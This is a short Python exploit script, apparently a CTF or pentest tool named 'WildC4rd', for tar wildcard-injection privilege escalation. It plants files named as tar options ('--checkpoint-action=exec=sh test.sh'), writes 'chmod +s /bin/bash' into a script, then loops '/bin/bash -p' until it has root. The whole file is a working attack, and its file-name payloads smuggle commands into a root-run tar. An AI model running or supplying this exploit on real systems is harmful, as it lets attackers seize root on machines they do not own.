import os
import subprocess

banner = """
__        ___ _     _  ____ _  _           _ 
\ \      / (_) | __| |/ ___| || |  _ __ __| |
 \ \ /\ / /| | |/ _` | |   | || |_| '__/ _` |
  \ V  V / | | | (_| | |___|__   _| | | (_| |
   \_/\_/  |_|_|\__,_|\____|  |_| |_|  \__,_|         
[+]Privilege_escalation of wildcard_injection

"""
print(banner)

payload  = "echo \"\" > \"--checkpoint-action=exec=sh test.sh\""

payload2 = "echo \"\" > --checkpoint=1"

payload3 = "echo \"chmod +s /bin/bash\" > test.sh"

payload4 = "ls -la /bin/bash"

payload5 = "/bin/bash -p"

os.system(payload)
os.system(payload2)
os.system(payload3)
os.system(payload4)

while True:
    os.system(payload5)
    user_level = subprocess.getoutput("whoami")

    if "root" in user_level:

        print("Success!!!!!!!!")
        sys.exit()

